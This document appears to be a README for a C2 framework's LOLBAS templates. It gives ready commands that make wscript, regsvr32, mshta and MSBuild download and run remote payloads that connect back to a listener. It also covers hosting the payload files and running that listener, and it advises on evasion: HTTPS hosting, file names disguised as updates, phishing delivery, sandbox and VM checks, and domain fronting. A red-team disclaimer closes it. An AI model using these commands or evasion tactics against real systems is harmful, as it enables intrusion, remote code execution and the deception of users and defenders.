# LOLBAS Templates & Instructions

## Overview

LOLBAS (Living Off The Land Binaries and Scripts) techniques use legitimate Windows binaries to execute malicious code, bypassing many security controls.

## Template Files

### 1. VBScript Payload (payload.vbs)
**Binary**: wscript.exe / cscript.exe

**Detection Level**: Medium

**Usage**:
```
wscript.exe http://YOUR_SERVER/payload.vbs
```

**Setup**:
1. Edit `payload.vbs` and replace `REPLACE_WITH_LHOST` and `REPLACE_WITH_LPORT`
2. Host the file on an HTTP server
3. Execute the command on target

---

### 2. SCT File (payload.sct)
**Binary**: regsvr32.exe

**Detection Level**: Low

**Usage**:
```
regsvr32.exe /s /n /u /i:http://YOUR_SERVER/payload.sct scrobj.dll
```

**Setup**:
1. Edit `payload.sct` and replace `REPLACE_WITH_LHOST` and `REPLACE_WITH_LPORT`
2. Host the file on an HTTP server
3. Execute the command on target

**Notes**: 
- Very effective for bypassing Application Whitelisting
- Low detection rate by most AV solutions

---

### 3. HTA File (payload.hta)
**Binary**: mshta.exe

**Detection Level**: Medium

**Usage**:
```
mshta.exe http://YOUR_SERVER/payload.hta
```

**Setup**:
1. Edit `payload.hta` and replace `REPLACE_WITH_LHOST` and `REPLACE_WITH_LPORT`
2. Host the file on an HTTP server
3. Execute the command on target

**Notes**:
- Can be embedded in phishing emails
- Opens as HTML Application

---

### 4. MSBuild XML (payload.xml)
**Binary**: MSBuild.exe

**Detection Level**: Very Low

**Usage**:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe http://YOUR_SERVER/payload.xml
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe http://YOUR_SERVER/payload.xml
```

**Setup**:
1. Edit `payload.xml` and replace `REPLACE_WITH_LHOST` and `REPLACE_WITH_LPORT` (note: port should be a number)
2. Host the file on an HTTP server OR use it locally
3. Execute the command on target

**Notes**:
- Extremely low detection rate
- Uses C# inline tasks
- Signed Microsoft binary

---

## HTTP Server Setup

### Python HTTP Server (Simple)
```bash
# In the lolbas_templates directory
python3 -m http.server 8080
```

### Python HTTP Server (Advanced with CORS)
```python
#!/usr/bin/env python3
from http.server import HTTPServer, SimpleHTTPRequestHandler

class CORSRequestHandler(SimpleHTTPRequestHandler):
    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET')
        self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate')
        return super().end_headers()

httpd = HTTPServer(('0.0.0.0', 8080), CORSRequestHandler)
print('Server running on port 8080...')
httpd.serve_forever()
```

### Apache/Nginx
Configure your web server to host these files with appropriate mime types:
- `.vbs` - text/vbscript
- `.sct` - text/xml
- `.hta` - application/hta
- `.xml` - text/xml

---

## Automated Payload Generation

Use the C2PY GUI to automatically generate these payloads with your LHOST/LPORT:

1. Open Payload Generator dialog
2. Select "Advanced Functions" → "LOLBAS Payload"
3. Choose technique or generate random
4. Files are automatically updated with your connection details

---

## Detection Evasion Tips

### 1. Use HTTPS
Host payloads over HTTPS to avoid network inspection:
```bash
# Generate self-signed certificate
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes

# Run Python HTTPS server
python3 -m http.server 443 --bind 0.0.0.0 --protocol HTTP/TLS
```

### 2. Random File Names
Rename payloads to look legitimate:
- `update.xml` instead of `payload.xml`
- `msoffice_update.hta` instead of `payload.hta`

### 3. Combine with Social Engineering
- Embed in Office documents
- Use with phishing campaigns
- Disguise as legitimate updates

### 4. Time Delays
Add delays to execution to bypass sandbox analysis

### 5. Environment Checks
Add checks for VM/sandbox environment before execution

---

## C2PY Listener Setup

Before executing any payload, ensure your C2PY listener is running:

1. Open C2PY GUI
2. Configure LHOST and LPORT
3. Click "Start Listener"
4. Wait for incoming connections

---

## Operational Security (OpSec)

⚠️ **Important Considerations**:

1. **Network Traffic**: All these techniques create network connections that can be detected
2. **Host-based Detection**: Some EDR solutions may detect these techniques
3. **User Interaction**: Some payloads may trigger user prompts
4. **Logging**: Windows logs execution of these binaries
5. **SSL Inspection**: Corporate proxies may inspect HTTPS traffic

### Recommended OpSec Practices:

- Use domain fronting for C2 communication
- Implement session jitter (random delays)
- Use encrypted payloads
- Rotate infrastructure frequently
- Test in isolated environment first

---

## Troubleshooting

### Payload Not Connecting
1. Verify LHOST/LPORT are correct
2. Check firewall rules
3. Ensure listener is running
4. Test network connectivity

### Execution Fails
1. Check if binary exists on target
2. Verify .NET Framework version (for MSBuild)
3. Check execution policy (for PowerShell)
4. Review Windows Event Logs

### HTTP Server Not Accessible
1. Check firewall rules
2. Verify server is listening on correct interface
3. Test with curl/wget from target network

---

## Legal Disclaimer

⚠️ **FOR AUTHORIZED RED TEAM ENGAGEMENTS ONLY**

These techniques should ONLY be used:
- During authorized penetration tests
- With written permission
- Within defined scope
- For security research in controlled environments

Unauthorized use may violate:
- Computer Fraud and Abuse Act (CFAA)
- Computer Misuse Act
- Local and international cybersecurity laws

**Always obtain proper authorization before testing!**

---

## Additional Resources

- LOLBAS Project: https://lolbas-project.github.io/
- MITRE ATT&CK: https://attack.mitre.org/
- Red Team Field Manual (RTFM)
- PayloadsAllTheThings GitHub Repository

---

## Support

For issues or questions:
1. Check this README first
2. Review C2PY documentation
3. Test in isolated lab environment
4. Verify listener configuration

---

**Last Updated**: February 2024
**Version**: 1.0
